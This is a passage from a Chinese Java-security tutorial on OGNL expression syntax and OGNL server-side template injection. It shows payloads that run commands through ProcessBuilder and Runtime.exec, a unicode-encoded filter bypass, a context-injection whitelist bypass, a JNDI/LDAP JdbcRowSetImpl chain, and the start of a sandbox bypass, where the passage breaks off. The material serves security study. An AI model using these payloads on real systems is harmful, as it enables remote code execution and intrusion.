-</span></span><span class="line"><span class="cl">    <span class="n">String</span><span class="o">[]</span> <span class="n">expressions</span> <span class="o">=</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">            <span class="s">&#34;#strings[0]&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">            <span class="s">&#34;#list[0]&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">            <span class="s">&#34;#list[0 + 1]&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">            <span class="s">&#34;#map[&#39;key1&#39;]&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">            <span class="s">&#34;#map[&#39;key&#39; + &#39;2&#39;]&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="o">};</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">express</span> <span class="o">:</span> <span class="n">expressions</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="n">express</span><span class="o">,</span><span class="n">context</span><span class="o">,</span> <span class="n">user</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">express</span><span class="o">+</span><span class="s">&#34; = &#34;</span><span class="o">+</span><span class="n">value</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>输出如下：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#strings[0] = str-aa
-</span></span><span class="line"><span class="cl">#list[0] = list-aa
-</span></span><span class="line"><span class="cl">#list[0 + 1] = list-bb
-</span></span><span class="line"><span class="cl">#map[&#39;key1&#39;] = value1
-</span></span><span class="line"><span class="cl">#map[&#39;key&#39; + &#39;2&#39;] = value2
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>(6) 投影与选择</strong></p>
-<p>OGNL 支持类似数据库当中的选择与投影功能。</p>
-<ul>
-<li>
-<p><strong>投影</strong>：选出集合当中的相同属性组合成一个新的集合。语法为 <code>collection.{XXX}</code> ，<code>XXX </code> 就是集合中每个元素的公共属性。</p>
-</li>
-<li>
-<p><strong>选择</strong>：选择就是选择出集合当中符合条件的元素组合成新的集合。语法为 <code>collection.{Y XXX}</code> ，其中 <code>Y</code> 是一个选择操作符，<code>XXX</code> 是选择用的逻辑表达式。</p>
-</li>
-</ul>
-<p>选择操作符有 3 种：</p>
-<ul>
-<li><code>?</code> ：选择满足条件的所有元素</li>
-<li><code>^</code> ：选择满足条件的第一个元素</li>
-<li><code>$</code> ：选择满足条件的最后一个元素</li>
-</ul>
-<p>测试代码如下：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">testSelection</span><span class="o">()</span><span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">User</span> <span class="n">p1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="o">(</span><span class="s">&#34;name1&#34;</span><span class="o">,</span> <span class="n">11</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">User</span> <span class="n">p2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="o">(</span><span class="s">&#34;name2&#34;</span><span class="o">,</span> <span class="n">22</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">User</span> <span class="n">p3</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="o">(</span><span class="s">&#34;name3&#34;</span><span class="o">,</span> <span class="n">33</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">User</span> <span class="n">p4</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="o">(</span><span class="s">&#34;name4&#34;</span><span class="o">,</span> <span class="n">44</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">User</span><span class="o">&gt;</span> <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">p1</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">p2</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">p3</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">p4</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;list&#34;</span><span class="o">,</span> <span class="n">list</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">String</span><span class="o">[]</span> <span class="n">expressions</span> <span class="o">=</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">            <span class="s">&#34;#list.{age}&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">            <span class="s">&#34;#list.{age + &#39;-&#39; + name}&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">            <span class="s">&#34;#list.{? #this.age &gt; 22}&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">            <span class="s">&#34;#list.{^ #this.age &gt; 22}&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">            <span class="s">&#34;#list.{$ #this.age &gt; 22}&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="o">};</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">express</span> <span class="o">:</span> <span class="n">expressions</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="n">express</span><span class="o">,</span><span class="n">context</span><span class="o">,</span> <span class="k">new</span> <span class="n">User</span><span class="o">());</span>
-</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">express</span><span class="o">+</span><span class="s">&#34; = &#34;</span><span class="o">+</span><span class="n">value</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>输出如下：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#list.{age} = [11, 22, 33, 44]
-</span></span><span class="line"><span class="cl">#list.{age + &#39;-&#39; + name} = [11-name1, 22-name2, 33-name3, 44-name4]
-</span></span><span class="line"><span class="cl">#list.{? #this.age &gt; 22} = [User(name=name3, age=33, address=null), User(name=name4, age=44, address=null)]
-</span></span><span class="line"><span class="cl">#list.{^ #this.age &gt; 22} = [User(name=name3, age=33, address=null)]
-</span></span><span class="line"><span class="cl">#list.{$ #this.age &gt; 22} = [User(name=name4, age=44, address=null)]
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>(7) 创建对象</strong></p>
-<p>OGNL 支持直接使用表达式来创建对象。主要有三种情况：</p>
-<ul>
-<li>构造 List 对象：使用 <code>{}</code> , 中间使用 <code>,</code> 进行分割如 <code>{&quot;aa&quot;, &quot;bb&quot;, &quot;cc&quot;}</code> ;</li>
-<li>构造 Map 对象：使用 <code>#{}</code> ，中间使用 <code>,</code> 进行分割键值对，键值对使用 <code>:</code> 区分，如 <code>#{&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;}</code> ;</li>
-<li>构造任意对象：直接使用已知的对象的构造方法进行构造。</li>
-</ul>
-<p>测试代码如下，可以看到， <strong>调用对象构造器创建对象后，还可以链式调用其方法</strong> ：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">testCreateObject</span><span class="o">()</span><span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">String</span><span class="o">[]</span> <span class="n">expressions</span> <span class="o">=</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">            <span class="s">&#34;#{&#39;key1&#39;:&#39;val1&#39;,&#39;key2&#39;:&#39;val2&#39;}&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">            <span class="s">&#34;{1,2,3,4}&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">            <span class="s">&#34;(new java.lang.ProcessBuilder(new java.lang.String[]{&#39;calc&#39;})).start()&#34;</span><span class="o">,</span>
-</span></span><span class="line"><span class="cl">    <span class="o">};</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">express</span> <span class="o">:</span> <span class="n">expressions</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="n">express</span><span class="o">,</span><span class="k">new</span> <span class="n">User</span><span class="o">());</span>
-</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">express</span><span class="o">+</span><span class="s">&#34; = &#34;</span><span class="o">+</span><span class="n">value</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>输出如下：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#{&#39;key1&#39;:&#39;val1&#39;,&#39;key2&#39;:&#39;val2&#39;} = {key1=val1, key2=val2}
-</span></span><span class="line"><span class="cl">{1,2,3,4} = [1, 2, 3, 4]
-</span></span><span class="line"><span class="cl">(new java.lang.ProcessBuilder(new java.lang.String[]{&#39;calc&#39;})).start() = java.lang.ProcessImpl@722c41f4
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="ognl其他特性">Ognl其他特性</h2>
-<p>首先看到官方文档：</p>
-<p><img src="/media/image-20210914141153559.png" alt="image-20210914141153559"></p>
-<p>大概意思就是：</p>
-<p>如果你在Ognl表达式后面再加一个带括号的表达式，并且括号前没有点号。例如：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#one(#two)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Ognl会将 <code>#one</code> 表达式的结算结果， <strong>再次作为一个Ognl表达式去解析</strong> ，并且会将括号内的表达式的计算结果作为本次解析的的root对象。</p>
-<p>第一个表达式的计算结果可能是任何类型的对象，如果它是一个 <code>AST</code> 类型的对象，那么Ognl会使用这个 <code>AST</code> 对象去解析（对应的root对象就是括号内表达式的计算结果）。如果第一个表达式的计算结果不是一个 <code>AST</code> 类型的对象，那么Ognl会把它当成一个字符串进行处理，将其转成一个 <code>AST</code> 对象然后再去解析。</p>
-<p>此外，可能存在一种冲突情况，例如我用如下方式进行上述操作：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">name(#two)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>运行后将得到非预期结果，因为这里的 <code>name</code> 会被当成root对象的一个方法进行调用，将得到类似如下错误：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">NoSuchMethodException</span><span class="o">:</span> <span class="n">com</span><span class="o">.</span><span class="na">pinger</span><span class="o">.</span><span class="na">javasec</span><span class="o">.</span><span class="na">ssti</span><span class="o">.</span><span class="na">ognl</span><span class="o">.</span><span class="na">pojo</span><span class="o">.</span><span class="na">User</span><span class="o">.</span><span class="na">name</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>要想能正常进行 <code>Expression Evaluation</code> ，需要将name括起来，强制性的进行 <code>Expression Evaluation</code> ：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(name)(#two)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这样，Ognl就不会把name当成root对象的方法来调用了。</p>
-<h2 id="ognl-ssti-sink">Ognl SSTI Sink</h2>
-<p><strong>(1) 常规手法</strong></p>
-<p>Ognl SSTI，要能成功解析表达式，需要执行到 <code>Ognl.getValue()</code> 或者 <code>Ognl.setValue()</code> 才能成功触发。例如 <code>Ognl.setValue()</code> 触发RCE：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="cm">/**
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * Ognl setValue() SSTI
-</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
-</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">sinkOne</span><span class="o">()</span><span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">expression</span><span class="o">=</span><span class="s">&#34;((new java.lang.ProcessBuilder(new java.lang.String[]{\&#34;calc\&#34;})).start())(1)&#34;</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">OgnlContext</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="n">OgnlContext</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Ognl</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="n">expression</span><span class="o">,</span><span class="n">context</span><span class="o">,</span><span class="s">&#34;&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>例如 <code>Ognl.getValue()</code> 触发RCE：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="cm">/**
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * Ognl getValue() SSTI
-</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
-</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">sinkTwo</span><span class="o">()</span><span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">expression</span><span class="o">=</span><span class="s">&#34;(new java.lang.ProcessBuilder(new java.lang.String[]{\&#34;calc\&#34;})).start()&#34;</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">OgnlContext</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="n">OgnlContext</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="n">expression</span><span class="o">,</span><span class="n">context</span><span class="o">,</span><span class="s">&#34;&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这里需要注意的就是，通过 <code>Ognl.setValue()</code> 方式来进行SSTI，需要使用Ognl的 <code>Expression Evaluation</code> 特性，否则不允许进行创建对象、调用静态方法等操作。而 <code>Ognl.getValue()</code> 则不需要考虑这个问题。</p>
-<p>此外，还有如下Tips：</p>
-<ul>
-<li>如果目标存在黑名单，前面说过，Ognl支持链式调用，那么就可以在context或者root对象中，通过链式调用找到可以利用的对象，例如 <code>org.apache.tomcat.InstanceManager</code> 对象；</li>
-<li>Ognl支持调用静态方法，所以可以使用 <code>@java.lang.Runtime@getRuntime().exec('calc')</code> 的方式进行RCE；</li>
-<li>Ognl支持通过 <code>new</code> 创建对象，所以可以使用 <code>new java.lang.ProcessBuilder(new java.lang.String[]{\&quot;calc\&quot;})).start()</code> 进行RCE；</li>
-</ul>
-<p><strong>(2) Bypass手法</strong></p>
-<p>Ognl支持UNICODE编码的表达式，例如如下UNICODE编码的恶意表达式可以成功执行：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">sinkFour</span><span class="o">()</span><span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="c1">// @java.lang.Runtime@getRuntime().exec(&#39;calc&#39;)
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">String</span> <span class="n">expression</span><span class="o">=</span><span class="s">&#34;\\u0040\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0040\\u0067\\u0065\\u0074\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0028\\u0029\\u002e\\u0065\\u0078\\u0065\\u0063\\u0028\\u0027\\u0063\\u0061\\u006c\\u0063\\u0027\\u0029&#34;</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">OgnlContext</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="n">OgnlContext</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="n">expression</span><span class="o">,</span><span class="n">context</span><span class="o">,</span><span class="s">&#34;&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>输出：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">java.lang.ProcessImpl@7506e922
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>此外，前面说到，Ognl支持 <code>Expression Evaluation</code> 的特性，基于这个特性，如果我们无法直接执行恶意的表达式，那么我们可以 <strong>先将恶意的Ognl表达式注入到Ognl的context或者root中</strong> ，然后通过 <code>Expression Evaluation</code> 特性进行调用。如下所示：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="cm">/**
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * 测试ExpressionEvaluation
-</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
-</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">testExpressionEvaluation</span><span class="o">()</span><span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="c1">// 绕过白名单检查，先讲恶意的Ognl表达式放入Ognl的上下文中
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">String</span> <span class="n">one</span><span class="o">=</span><span class="s">&#34;@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;)&#34;</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">OgnlContext</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="n">OgnlContext</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;one&#34;</span><span class="o">,</span><span class="n">one</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;two&#34;</span><span class="o">,</span><span class="s">&#34;twotow&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">attackStr</span><span class="o">=</span><span class="s">&#34;(#one)(#two)&#34;</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">Ognl</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="n">attackStr</span><span class="o">,</span> <span class="n">context</span><span class="o">,</span><span class="s">&#34;&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这里并不是直接执行Ognl表达式，而是先想办法将恶意的Ognl表达式注入到context中，然后通过 <code>(#one)(#two)</code> 的方式（ <code>Expression Evaluation</code> 特性）进行触发。</p>
-<p>最终值得一提的就是，很多时候想RCE，我们不必执着于寻找类似 <code>Runtime</code> 和 <code>ProcessBuilder</code> 等类， <code>JNDI</code> 和 <code>RMI</code> 等同样能RCE：）例如：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">InstanceManager</span> <span class="o">=</span> <span class="err">#</span><span class="n">application</span><span class="o">[</span><span class="err">&#39;</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">tomcat</span><span class="o">.</span><span class="na">InstanceManager</span><span class="err">&#39;</span><span class="o">],</span>
-</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="n">rw</span><span class="o">=</span><span class="err">#</span><span class="n">InstanceManager</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="err">&#39;</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">rowset</span><span class="o">.</span><span class="na">JdbcRowSetImpl</span><span class="err">&#39;</span><span class="o">),</span>
-</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="n">rw</span><span class="o">.</span><span class="na">setDataSourceName</span><span class="o">(</span><span class="err">&#39;</span><span class="n">ldap</span><span class="o">:</span><span class="c1">//127.0.0.1:10086/InstanceManager&#39;),
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">#</span><span class="n">rw</span><span class="o">.</span><span class="na">getDatabaseMetaData</span><span class="o">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>最后，如果靶机使用了 <code>Ognl</code> 官方的沙箱： <code>System.setProperty(&quot;ognl.security.manager&quot;,&quot;true&quot;);</code> ，且使用了默认的 <code>MemeberAccess</code> ，那么可以使用如下方式进行绕过：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="cm">/**
-</span></span></span><span class="line"><span class="cl"><span class="cm"> * Bypass OGNL sandbox
-</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
-</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">bypassSandBox</span><span class="o">()</span><span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span><span class="s">&#34;ognl.security.manager&#34;</span><span class="o">,</span><span class="s">&#34;true&#34;</span><span class="o">);</span>
